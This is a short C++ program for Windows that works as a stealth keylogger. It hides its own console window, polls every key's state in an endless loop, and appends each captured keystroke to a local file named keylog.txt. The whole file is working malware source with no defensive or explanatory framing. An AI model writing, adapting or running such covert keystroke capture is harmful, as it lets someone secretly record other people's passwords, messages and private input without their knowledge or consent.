#include <iostream>
#include <fstream>
#include <windows.h>
#include <cctype>


void hideConsole(){
    // get the console window handle
    HWND consoleWindow = GetConsoleWindow(); 

    // check if console window handle retrieved
    if (consoleWindow != NULL) {
        ShowWindow(consoleWindow, SW_HIDE); // hide console
    }else{ exit(1); }
}

int main(){

    bool key_state[256] = {true}; // array to track key states
    char key_char = ' ';
    

    hideConsole();

    std::ofstream keylog("keylog.txt", std::ios::app); // open or create a text file in append mode

    // if the file didn't open, shut the program down
    if (!keylog.is_open()){
        exit(1);
    }

    // loop to continuously track key inputs
    while (true) {

        // check each key
        for (int key = 1; key <= 135; key++) {

            // check if key pressed
            if (GetAsyncKeyState(key) & 0x8000) {
                
                if (key_state[key]) {
                    continue; // skip this key if already pressed
                }

                key_char = MapVirtualKey(key, 2);
                
                if (!key_state[VK_SHIFT]) { keylog << (char) tolower(key_char);}
                else{ keylog << key_char;}
                
                keylog.flush(); // flush the output to the file

                key_state[key] = true; // update key state
            } else {
                key_state[key] = false; // update key state 
            }   
        }

        // delay to avoid high CPU usage
        Sleep(10);
    } 

    keylog.close();

    return 0;
}